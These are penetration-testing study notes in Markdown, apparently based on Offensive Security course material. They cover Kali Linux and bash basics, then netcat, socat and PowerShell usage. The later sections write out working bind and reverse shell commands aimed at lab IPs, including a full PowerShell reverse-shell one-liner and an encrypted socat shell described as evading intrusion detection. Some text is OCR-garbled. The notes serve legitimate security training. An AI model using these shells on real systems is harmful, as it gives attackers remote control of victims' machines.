[TOC]



# Pentest with Kali Linux

## Getting Comfortable with Kali Linux

### Creating Directories

**Create multiple drectory**

```
kali@kali:~$ mkdir -p test/{ recon , exploit,report}
kali@kali:~$ ls -1 test/
exploit
recon
report
```



### Finding Files in Kali Linux

**1. which**

```
kali @kali:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

kali@kali:~$ which sbd
/usr/bin/sbd
```



**2. locate**

```
# To manually update the locate.db 
kali @kali :-$ sudo updatedb

kali@kali: -$ locate sbd.exe
/usr/share/w;ndows-resources/sbd/sbd.exe
```



**3. find**

```
kal i@kali:-$ sudo find / -name sbd*
/ usr/bin/sbd
/us r/share/doc/sbd
/ us r/sha re/windows-resources/sbd
/us r/share/windows-resources/sbd/sbd.exe
/us r/sha re/windows-resources/sbd/sbdbg.exe
/var/cache/apt/archives/sbd_l.37-lkali3_amd64.deb
/va r/lib/dpkg/ i nfo/sbd . mdSsums
/var/lib/dpkg/info/sbd. li st
```



## Managing Kali Linux Services

```
# Start SSH service
$ sudo systemctl start ssh

# verify that the SSH service is running and listening on TCP port 22
$ sudo ss -antlp | grep sshd
LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:(("sshd",pid=1482,fd=3))
LISTEN 0      128             [::]:22           [::]:*    users:(("sshd",pid=1482,fd=4))

# SSH service start automatically at boot time
$ sudo systemctl enable ssh

# To see a table of all available services
$ systemctl list-unit-files
```



## Searching, Installing, and Removing Tools

```
# Update the list of available packages 
kali@kali:~$ sudo apt update

# upgrade the installed packages and core system to the latest versions
kali@kali:~$ sudo apt upgrade

# Upgrade single package
kali@kali:-$ apt upgrade metasploit-framework.

# displays much of the information stored in the internal cached package database
kali@kali:-$ apt-cache search pure-ftpd

# command completely removes packages 
kali@kali:~$ sudo apt remove --purge pure-ftpd

# dpkg is the core tool used to install a package, either directly or indirectly through APT
$ sudo dpkg -i man-db_2.1.e.2-s_amd64.deb
```



## Command Line Fun

### The Bash Environment

```
$ echo $PATH
/usr/local/sbi n:/usr/local/bin:/usr/sbin:/usr/bin :/sbin:/bin

kali@kali:-$ echo $USER
kali
kali@kali:~$ echo $PWD
/home/kali
kali@kali:-$ echo $HOME
/home/kali
```

**Environment** 

```
# define environment variables using export command
kali@kali:~$ export b=le.11.1.220

kali@ka1i:~$ ping -c 2 $b
PING 10.11.1.220 (10.11.1.220) 56(84) bytes of data.
64 bytes from 10.11.1.220: icmp_seq=l ttl=62 time=2.23 ms
64 bytes from 10.11.1.220: icmp_seq=2 ttl=62 time=l.56 ms

# View other environment variables defined by default in Kali Linux
kali@kali:~$ env
```

**Bash History Tricks**

```
kali@kali:~$ history
1 echo $PWD
2 clear
3 history


# To rerun the first command
kali@kali:~$ !1


```

* By default. the command history is saved to the .baslulistory file in the user home directory. 

* Two environment variables control the history size: 

  - **HISTSIZE** controls the number of commands stored in memory for the current session 

  - **HISTFILESIZE** configures how many commands are kept in the history file. 

    
    
- These variables can be edited according to our needs and saved to the Bash configuration file **(.bashrc)** 

### Piping and Redirection

Every program run from the command line has three data streams connected to it that serve as
communication channels w ith the external environment. These streams are defined as follows:

|       Stream Name        |                  Description                   |
| :----------------------: | :--------------------------------------------: |
|  Standard Input (STDIN)  |           Data fed into the program            |
| Standard Output (STDOUT) | Output from the program (defaults to terminal) |
| Standard Error (STDERR)  |     Error messages (defaults to terminal)      |



### Redirecting to a New File

```
kali@kali:~$ echo "Kati Linux is an open source project" > redirection_test.txt
```

### Redirecting to an Existing File

To append additional data to an existing file

```
kali@kali:~$ echo "that is maintained and funded by Offensive Security" >> redirection_test.txt
```

### Redirecting from a File

```\
kali@kali:~$ wc -m < redirection_test.txt
89
```

### Redirecting STDERR

```
kali@kali:~$ ls ./test
ls: cannot access '/test': No such file or directory

kali@kali:~$ ls ./test 2>error.txt

kali@kali:~$ cat error.txt
ls: cannot access '/test': No such file or directory
```


### Piping

```
kali@kali:~$ cat error.txt
ls: cannot access '/test': No such file or directory

kali@kali:~$ cat error.txt | wc -m
53

kali@kali:~$ cat error.txt | wc -m > count.txt

kali@kali:~$ cat count.txt
53
```



### Text Searching and Manipulation

**1. grep**

```
$ ls -la /usr/bin | grep zip
-rwxr-xr-x  3 root root        38984 Jul 20 09:00 bunzip2
-rwxr-xr-x  3 root root        38984 Jul 20 09:00 bzip2
-rwxr-xr-x  1 root root        18424 Jul 20 09:00 bzip2recover
-rwxr-xr-x  1 root root        22792 Jul 27  2019 funzip
-rwxr-xr-x  1 root root         3516 Mar 23  2020 gpg-zip
-rwxr-xr-x  2 root root         2346 Mar 19  2020 gunzip
-rwxr-xr-x  1 root root        98048 Mar 19  2020 gzip
-rwxr-xr-x  1 root root         4754 Aug 15 04:26 p7zip
```

**2. sed**

```
$ echo "I need to try hard" | sed 's/hard/harder/'
I need to try harder
```

**3. cut**

- used to extract a section of text from a line and output it to the standard output.

```
kali@kali: -$ echo "I hack binades,web apps,mobile apps, and just about anything else" | cut -f 2 -d ","                                     
web apps
```

```
kali@kali: -$ cut -d ":" -f 1 /etc/passwd                                                 
root
daemon
bin
```

**4. awk**

- used as a data extraction and reporting tool.

```
$ echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
hello friend
```



### Practical Example



```
$ wc -l access.log                                                  
1173 access.log

$ cat access.log| cut -d " " -f 1 | sort -u
201.21.152.44
208.115.113.91
208.54.80.244
208.68.234.99
70.194.129.34
72.133.47.242
88.112.192.2
98.238.13.253
99.127.177.95

$ cat access.log| cut -d " " -f 1 | uniq -c | sort -urn
   1038 208.68.234.99
     59 208.115.113.91
     21 99.127.177.95
     13 208.54.80.244
      9 208.54.80.244
      8 88.112.192.2
      7 70.194.129.34
      1 201.21.152.44

$ cat access.log| grep "208.68.234.99" | cut -d "\"" -f 2 | uniq -c
   1038 GET //admin HTTP/1.1
   
$ cat access.log| grep "208.68.234.99" | grep 'admin' | sort -u
208.68.234.99 - - [22/Apr/2013:07:51:20 -0500] "GET //admin HTTP/1.1" 401 742 "-" "Teh Forest Lobster"
208.68.234.99 - admin [22/Apr/2013:07:51:25 -0500] "GET //admin HTTP/1.1" 200 575 "-" "Teh Forest Lobster"


```

### Comparing Files

**1. comm**

- **comm** command compares two text files, displaying the lines that are unique to each one, as
  well as the lines they have in common. 

- It outputs three space-off set columns: 

  - the first contains lines that are unique to the first file or argument; 

  - the second contains lines that are unique to the second file or argument; and 

  - the third column contains lines that are shared by both files. 

- The -n     switch, where «n• is either 1, 2, or 3, can be used to suppress one or more columns, depending on the need.

```
kali @kali:~$ cat scan-a.txt
192.168.1.1
192.168.1.2
192.168.1.3
192.168.1.4
192.168.1.5

kali @kali:~$ cat scan-b.txt
192.168.1.1
192.168.1.3
192.168.1.4
192.168.1.5
192.168.1.6

kali@kali:~$ comm scan-a.txt scan-b.txt
				192.168.l.l
192.168.l.2
				192.168.l.3
				192.168.l.4
				192.168.l.5
		192 .168. l. 6

kali@kali:~$ comm -12 scan-a.txt scan-b.txt
192.168.1.1
192.168.1.3
192.168.1.4
192.168.1.5
```



**2. diff**

- The **diff** command is used to detect differences between files, similar to the comm command.
  However, diff is much more complex and supports many output formats. 
- Two of the most popular formats include the context format (-c) and the unified format (-u).

```
kali@kali:~$ diff -c scan-a.txt scan-b.txt                                                                                                  1 ⨯
*** scan-a.txt	2020-12-01 00:57:27.294828978 -0500
--- scan-b.txt	2020-12-01 00:57:43.882932662 -0500
***************
*** 1,6 ****
  192.168.1.1
- 192.168.1.2
  192.168.1.3
  192.168.1.4
  192.168.1.5
  
--- 1,6 ----
  192.168.1.1
  192.168.1.3
  192.168.1.4
  192.168.1.5
+ 192.168.1.6

kali@kali:~$ diff -u scan-a.txt scan-b.txt                                                                                                  1 ⨯
--- scan-a.txt	2020-12-01 00:57:27.294828978 -0500
+++ scan-b.txt	2020-12-01 00:57:43.882932662 -0500
@@ -1,6 +1,6 @@
 192.168.1.1
-192.168.1.2
 192.168.1.3
 192.168.1.4
 192.168.1.5
+192.168.1.6
```

**3. vimdiff**

- vimdiff opens vim with multiple files, one in each window. 

- The differences between files are highlighted, which makes it easier to visually inspect them. 

- There are a few shortcuts that may be useful. For example:

  - d + o: gets changes from the other window into the current one

  - d + p: puts the changes from the current window into the other one

  - ] + c: jumps to the next change

  - [ + c: jumps to the previous change

  - ctrl + w and :arrow_left: or :arrow_right:: switches to the other split window.

    

### Managing Processes

**Backgrouding Processes**

- The quickest way to background a process is to append an ampersand (&) to the end of the
  command to send it to the background immediately after it starts.

```
$ ping -c 400 localhost > ping_results.txt &
```

But what would have happened if we had forgotten to append the ampersand at the end of the
command?

```
$ ping -c 400 localhost > ping_results.txt                                                 
^Z
zsh: suspended  ping -c 400 localhost > ping_results.txt
                                                                                          
$ bg                                                                                       [2]  - continued  ping -c 400 localhost > ping_results.txt                                 
```

**Jobs Control:jobs and fg**

```
# lists the jobs that are running in the current terminal session
$ jobs                                                                                     [1]  + suspended  ping -c 400 localhost > ping_results.txt
[2]  - running    ping -c 400 localhost > ping_results.txt

# returns a job to the foreground
$ fg %1                                                                                   [1]  - continued  ping -c 400 localhost > ping_results.txt
```



### Process Control : ps and kill

**ps (process status)**

```
$ ps -ef                                  
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 Nov30 ?        00:00:07 /sbin/init splash
root           2       0  0 Nov30 ?        00:00:00 [kthreadd]
root           3       2  0 Nov30 ?        00:00:00 [rcu_gp]
root           4       2  0 Nov30 ?        00:00:00 [rcu_par_gp]
root           6       2  0 Nov30 ?        00:00:00 [kworker/0:0H-kblockd]
root           9       2  0 Nov30 ?        00:00:00 [mm_percpu_wq]
root          10       2  0 Nov30 ?        00:00:00 [ksoftirqd/0]
root          11       2  0 Nov30 ?        00:00:09 [rcu_sched]
root          12       2  0 Nov30 ?        00:00:00 [migration/0]
root          13       2  0 Nov30 ?        00:00:00 [cpuhp/0]
root          14       2  0 Nov30 ?        00:00:00 [cpuhp/1]
root          15       2  0 Nov30 ?        00:00:00 [migration/1]
root          16       2  0 Nov30 ?        00:00:00 [ksoftirqd/1]
root          18       2  0 Nov30 ?        00:00:00 [kworker/1:0H-kblockd]
root          19       2  0 Nov30 ?        00:00:00 [cpuhp/2]
root          20       2  0 Nov30 ?        00:00:00 [migration/2]
root          21       2  0 Nov30 ?        00:00:00 [ksoftirqd/2]
```

- e: select all processes
- f: display full format listing (UID, PID, PPID, etc.)

```
$ ps -fC mousepad                                                                         
UID          PID    PPID  C STIME TTY          TIME CMD
kali        3804     983  1 03:48 ?        00:00:00 mousepad

# Stop the process
$ kill 3804
```

### File and Command Monitoring

**tail**

- The most common use of **tail** is to monitor log file entries as they are being written.

```
kali@kali:-$ sudo tail -f /var/log/apache2/access.log
192.168.0.249 - - [01/Dec/2020:04:25:14 -0500] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
192.168.0.249 - - [01/Dec/2020:04:25:14 -0500] "GET /icons/openlogo-75.png HTTP/1.1" 200 6040 "http://192.168.0.223/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
192.168.0.249 - - [01/Dec/2020:04:25:14 -0500] "GET /favicon.ico HTTP/1.1" 404 491 "http://192.168.0.223/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"
192.168.0.249 - - [01/Dec/2020:04:26:09 -0500] "GET / HTTP/1.1" 200 3380 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"

```

The -f optlon (follow) is very useful as it continuously updates the output as the target file grows.
Another convenient switch is -n x, which outputs the last x number of lines, instead of the default
value of 10.

**watch**

```
kali@kali:-$ watch -n 5 w
Every 5.0s: w                                                                                            kali: Tue Dec  1 04:35:07 2020

 04:35:07 up  7:46,  2 users,  load average: 0.02, 0.03, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
kali     tty7     :0               20:47    7:48m 37.39s  0.36s xfce4-session
kali     pts/1    192.168.0.249    20:49   25.00s  1:23   0.02s w

```



### Downloading Files

 **wget**

- -O switch to save the destination file with a different name on the local machine

```
$ wget -O report_wget.pdf https://www.offensive-security.com/reports/penetration-testing-sampte-report-2013.pdf
```



**curl**

- is a tool to transfer data to or from a server using a host of protocols including IMAP/S,
  POP3/S, SCP, SFTP, SMB/S, SMTP/S, TELNET, TFTP, and others. A penetration tester can use this
  to download or upload files and build complex requests.

```
$ curl -o report_wget.pdf https://www.offensive-security.com/reports/penetration-testing-sampte-report-2013.pdf
```



**axel**

- is a download accelerator that transfers a file from a FTP or HTTP server through multiple
  connections. This tool has a vast array of features, but the most common is -n, which is used to
  specify the number of multiple connections to use. In the following example, we are also using the
  -a option for a more concise progress indicator and -o to specify a different file name for the
  downloaded file

```
kali@kali : ~$ axel -a -n 28 -o report_axel.pdf https://www.offensive-security.com/repor
ts/penetration-testing-sample-report-2813.pdf
```



### Customizing the Bash Environment

**Bash History Customization**

The HISTCONTROL variable defines whether or not to remove duplicate commands, commands
that begin with spaces from the history, or both. By default, both are removed but you may find it
more useful to only omit duplicates.

```
kali@kali:~$ export HISTCONTROL=ignoredups
```

The HISTIGNORE variable is particularly useful for filtering out basic commands that are run
frequently, such as Is, exit, history, bg, etc:

```
kali @kali:~$ export HISTIGNORE="&:ls:bg:exit:history"

kali@kali:~$ mkdir test

kali@kali:~$ cd test

kali@kali:~/test$ ls

kali@kali:~/test$ pwd
/home/kali/test

kali@ka1i:~/test$ ls

kali@ka1i:~/test$ history
l export HISTIGNORE="&:ls:bg:exit:history"
2 mkdir test
3 cd test
4 pwd
```



HISTTIMEFORMAT controls date and/or time stamps in the output of the history command.

```
kali@kali:~$ export HISTTIMEFORMAT='%F %T'
```

**Alias**

```
$ alias lsa='ls -la'
                                                                                          $ lsa
total 8
drwxr-xr-x  2 kali kali 4096 Dec  1 06:42 .
drwxr-xr-x 16 kali kali 4096 Dec  1 06:42 ..
                                                                            
$ alias             
diff='diff --color=auto'
egrep='egrep --color=auto'
fgrep='fgrep --color=auto'
grep='grep --color=auto'
history='history 0'
ip='ip --color=auto'
l='ls -CF'
la='ls -A'
ll='ls -l'
ls='ls --color=auto'
lsa='ls -la'

# remove alias
$ unalias lsa
```

**Persistent Bash Customization**

The behavior of interactive shells in Bash is determined by the system-wide bashrc file located in
/etc/bash.bashrc. The system-wide Bash settings can be overridden by editing the .bashrc file
located in any user's home directory.

```
$ cat ~/.bashrc       
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize
......
```



## Practical Tools

### Netcat

#### Connecting to a TCP/UDP Port

We will supply several arguments: the -n option to skip DNS name resolution; -v to add some verbosity; the dest ination IP address; and the destination port number:

````
kali@kali:~$ nc -nv 10,11,8,22 118
(UNKNOWN) [10.11.0.22] 110 (pop3) open
+OK POP3 server lab ready <00003.1277944@lab>

# Try to interact with the server
kali@kali:-$ nc -nv 10.11.e.22 118
(UNKNOWN) [10.11.0.22) 110 (pop3) open
+OK POP3 server lab ready <00004.1546827@lab>
USER offsec
+OK offsec welcome here
PASS offsec
-ERR unable to tock mai l box
quit
+OK POP3 serve r lab signing off.
kali@kali:-$
````

#### Listening on a TCP/UDP Port

We will use the -n option to disable DNS name resolution, -l to create a listener, -v to add some verbosity, and -p to specify the listening port number:

```
C:\Users\offsec> nc -nlvp 4444
listening on [any] 4444 ...
```

Now that we have bound port 4444 on this Windows machine to Netcat, let's connect to that port
from our Linux machine and enter a line of text:

```
kali @kali:-$ nc -nv 10.11.e.22 4444
(UNKNOWN ) ( 10.11 .0 . 22] 4444 (?) open
This chat is from the linux machine
```

Our text will be sent to the Windows machine over TCP port 4444 and we can continue the #chat•
from the Windows machine:

```
C:\Users\offsec> nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4) 43447
This chat is from the linux machine
This chat is from the windows machine
```

#### Transferring Files with Netcat

```
C:\Users\of fsec> nc - nlvp 4444 > incoming.exe
listeni ng on [any] 4444 ...
```

On the Kali system, we will push the wget.exe file to the Windows machine through TCP port 4444:

```
kali@kali:-$ locate wget . exe
/usr/share/windows-resources/binaries/wget.exe
kali@kali:-$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
(UNKNOWN) (10.11.0.22) 4444 (?} open
```

The connection is received by Netcat on the Windows machine as shown below:

```
C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any) 4444
connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43459
^C
C:\Users\offsec>
```

Notice that we have not received any feedback from Netcat about our file upload progress. In this
case, since the file we are uploading is small, we can just wait a few seconds, then check whether
the file has been fully uploaded to the Windows machine by attempting to run it:

```
C: \Users\offsec> incoming.exe -h
GNU Wget 1.9.1, a non-interactive network retriever.
Usage: incoming (OPTION) ... (URL] ••.
```

#### Remote Administration with Netcat

**Netcat Bind Shell Scenario**

Bob will check his loca l IP address, then run Netcat w ith the -e option to execute cmd.exe once a
connection is made to the listening port:

```
C:\Users\offsec> ipconfig
Wi ndows IP Configuration
Ethernet adapter Local Area Connection:
Connection-specific DNS Suffix
IPv4 Address. . . . . . . . . . . : 10.11.0.22
Subnet Mask . . . . . . . . . . . : 255.255.0.0
Default Gateway . . . . . . . . . : 10.11.0.1

C:\Users\offsec> nc -nlvp 4444 -e cmd.exe
listening on [any] 4444 .••
```

```
kali @kali:~$ ip address show eth0 | grep inet
	inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0

kali@kali:~$ nc -nv 18 ,11,8,22 4444
(UNKNOWN) [10.11.0.22) 4444 (?) open
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec> ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
Connection-specific DNS Suffix
IPv4 Address. . . . . . . . . . . : 10.11.0.22
Subnet Mask . . . . . . . . . . . : 255.255.0.0
Default Gateway . . . . . . . . . : 10.11.0.1
```

**Reverse Shell Scenario**

To get this working, Bob will first set up Netcat to listen for an incoming shell. We will use port 4444 in our example:

```
C:\Users\offsec> nc - nlvp 4444
listening on [any] 4444 ...
```

Now, Alice can send a reverse shell from her Linux machine to Bob. Once again, we use the -e
option to make an application available remotely, which in this case happens to be /bin/bash, the
Linux shell:

```
kali@kali:-$ ip address show eth0 | grep inet
		inet 10.11.0.4/16 brd 10.11.255.255   scope global dynamic eth0

kali@kali:-$ nc -nv 10.11.e.22 4444 -e /bin/bash
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

Once the connection is established, Alfce's Netcat will have redirected /bin/bash input, output and
error data streams to Bob's machine on port 4444, and Bob can interact with that shell:

```
C:\Users\offsec>nc -ntvp 4444
listening on [any] 4444 ..•
connect to (10.11.0.22] from <UNKNOWN) (10.11.0.4) 43482

ip address show eth0 | grep inet
		inet 10.11.0.4/16 brd 10.11.255.255  scope global dynamic eth0
```



### Socat

First, let's connect to a remote server on port 80 using both Netcat and socat:

```
kali@kali:~$ nc <remote server's ip address> 80

kali@kali:~$ socat - TCP4:<remote server's ip address>:80
```

Because root privileges are required to bind a listener to ports below 1024, we need to use sudo
when starting a listener on port 443:

```
kali@kali:~$ sudo nc -lvp localhost 443

kali@kali:-$ sudo socat TCP4-LISTEN:443 STDOUT
```

```
c:\socat>socat - TCP4:192.168.0.223:443
```

#### Socat Transfer Files

On Alice's side, we will share the file on port 443. In this example, the TCP4-LISTEN option specifies
an IPv4 listener, fork creates a child process once a connection is made to the listener, which
allows multiple connections, and file: specifies the name of a file to be transferred:

```
tail /usr/share/wordlists/nmap.lst > secret_passwords.txt 
```

````
kali@ka1i:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
````

```
c:\socat>socat TCP4:192.168.0.223:443 file:received_secret_passwords.txt,create
```

#### Socat Reverse Shells

Let's take a look at a reverse shell using socat. First, Bob will start a listener on port 443. To do this,
he will supply the -d -d option to increase verbosity (showing fatal, error, warning, and notice
messages), TCP4-LISTEN:443 to create an IPv4 listener on port 443, and STDOUT to connect
standard output (STDOUT) to the TCP socket:

```
c:\socat>socat -d -d TCP4-LISTEN:443 STDOUT
2020/12/02 12:34:32 socat[3324] N listening on AF=2 0.0.0.0:443
```

Next, Alice wi ll use socat' s EXEC option (similar to the Net cat -e option), which w ill execute the
given program once a remote connection is established. In this case, Alice wi ll send a /bin/bash
reverse shell (with EXEC:/bin/bash) to Bob's listening socket on 10.11.0.22:443:

```
kali@ka1i:~$ socat TCP4:192.168.0.198:443 EXEC:/bin/bash
```

Once connected, Bob ca n enter commands from his socat session, which will execute on Alice's
machine .

```
2020/12/02 12:37:54 socat[6288] N accepting connection from AF=2 192.168.0.223:45662 on AF=2 192.168.0.198:443
2020/12/02 12:37:54 socat[6288] N using stdout for reading and writing
2020/12/02 12:37:54 socat[6288] N starting data transfer loop with FDs [6,6] and [1,1]
whoami
kali
id
uid=1000(kali) gid=1000(kali) 
```



#### Socat Encrypted Bind Shells

- To add encryption to a bind shell. we will rely on Secure Socket Layer 85 certificates. This level of
  encryption will assist in evading intrusion detection systems (IDS) 86 and will help hide the sensitive
  data we are transceiving.
- To continue with the example of Alice and Bob, we will use the openssl. application to create a self-
  signed certificate using the following options:
  - **req**: initiate a new certificate signing request
  - **-newkey**: generate a new private key
  - **rsa:2848**: use RSA encryption with a 2,048-bit key length.
  - **-nodes**: store the private key without passphrase protection
  - **-keyout**: save the key to a file
  - **-xse9**: output a self-signed certificate instead of a certificate request
  - **-days**: set validity period in days
  - **-out**: save the certificate to a file

Once we generate the key, we will cat the certificate and its private key into a file, which we will
eventually use to encrypt our bind shell.

```
kali@kali : ~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt                1 ⨯
Generating a RSA private key
...................................................................................................................................................................+++++
...............................................................+++++
writing new private key to 'bind_shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:Georgia
Locality Name (eg, city) []:Atlanta
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

Now that the key and certificate have been generated, we first need to convert them to a format
socat will accept. To do so, we combine both the bincLshell.key and bind_shell.crt files into a single
.pem file before we create the encrypted socat listener.

```
kali@kali : ~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
```

We will use the OPENSSL-LISTEN option to create the listener on port 443, cert=bi nd_shel. l.. pem
to specify our certificate file, verify to disable SSL verification, and fork to spawn a child process
once a connection is made to the listener:

```
kali@kali : ~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```

We will use - to transfer data between STDIO and the remote host, OPENSSL to establish a remote
SSL connection to Alice's listener on 192.168.0.223:443, and verify=0 to disable SSL certificate
verification:

```
c:\socat>socat - OPENSSL:192.168.0.223:443,verify=0
id
uid=0(root) gid=0(root) groups=0(root),141(kaboxer)
whoami
root
```

### PowerShell and Powercat

Windows PowerShell  is a task-based command line shell and scripting language. It is designed
specifically for system administrators and power-users to rapidly automate the administration of
multiple operating systems (Linux, macOS, Unix, and Windows) and the processes related to the
applications that run on them.

Needless to say, PowerShell is a powerful tool for penetration testing and can be installed on (or is
installed by default on) various versions of Windows. It is installed by default on modern Windows
platforms beginning with Windows Server 2008 R2 and Windows 7. 

Windows PowerShell 5.0 runs on the following versions of Windows:

- Windows Server 2016, installed by default
- Windows Server 2012 R2/Windows Server 2012/Windows Server 2008 R2 with Service Pack
  1 /Windows 8.1 /Windows 7 with Service Pack 1 (install Windows Management Framework
  5.0 to run it)

Windows PowerShell 4.0 runs on the following versions of Windows:

- Windows 8.1 /Windows Server 2012 R2, installed by default

- Windows 7 with Service Pack 1 /Windows Server 2008 R2 with Service Pack 1 (install
  Windows Management Framework 4.0 to run it)

Windows PowerShell 3.0 runs on the following versions of Windows:

- Windows 8/Windows Server 2012, installed by default
- Windows 7 with Service Pack 1 /Windows Server 2008 R2 with Service Pack 1 /2 (install
  Windows Management Framework 3.0 to run it)

PowerShell maintains an execution policy that determines which type of PowerShell scripts (if any)
can be run on the system. The default policy is "Restricted", which effectively means the system
will neither load PowerShell configuration files nor run PowerShell scripts. For the purposes of this
module, we will need to set an ·unrestricted» execution policy on our Windows cl ient machine. To
do this, we click the Windows Start button, right-click the Windows PowerShe/1 application and
select Run as Administrator. When presented with a User Account Control prompt, select Yes and
enterSet-ExecutionPolicy Unrestricted:

```
PS C:\Windows\system32> Set-ExecutionPolicy Unrestricted

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): Y

PS C:\Windows\system32> Get-ExecutionPolicy
Unrestricted
PS C:\Windows\system32>
```

#### Powershell File Transfers

```
C:\Users\sherwinowen\Desktop>powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.0.223/wget.exe','C:\Users\sherwinowen\Desktop\wget.exe')"

C:\Users\sherwinowen\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 3208-00E9

 Directory of C:\Users\sherwinowen\Desktop

12/02/2020  03:05 PM    <DIR>          .
12/02/2020  03:05 PM    <DIR>          ..
12/02/2020  08:03 AM               925 HWID.log
12/02/2020  03:05 PM           308,736 wget.exe
               2 File(s)        309,661 bytes
               2 Dir(s)  40,070,180,864 bytes free

C:\Users\sherwinowen\Desktop>wget -V
GNU Wget 1.9.1

Copyright (C) 2003 Free Software Foundation, Inc.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

Originally written by Hrvoje Niksic <hniksic@xemacs.org>.
```



#### PowerShell Reverse Shells

```
kali@kali : ~$ sudo nc -lvnp 443                   
[sudo] password for kali: 
listening on [any] 443 ...
```



```
$client = New-Object System.Net.Sockets.TCPClient('192.168.0.223',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0 .. 65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);	
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
}
$client.Close();
```



```
C:\Windows\system32>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.223',443); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

This one-liner may seem very arduous at first glance, but there is no need to memorize it; we would
likely copy-and-paste this type of command (replacing the IP and port number) during a live
penetration test.

Finally, we receive the reverse shell with Netcat:

```
$ sudo nc -lvnp 443                   
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.0.223] from (UNKNOWN) [192.168.0.198] 50691
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::f122:da68:b61a:befe%6
   IPv4 Address. . . . . . . . . . . : 192.168.0.198
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.0.1
```

#### PowerShell Bind Shells

```
C:\Users\offsec> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```



```
kali@kali:-$ nc -nv 192.168.0.198 443 
(UNKNOWN) [192.168.0.198] 443 (https) open
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::f122:da68:b61a:befe%6
   IPv4 Address. . . . . . . . . . . : 192.168.0.198
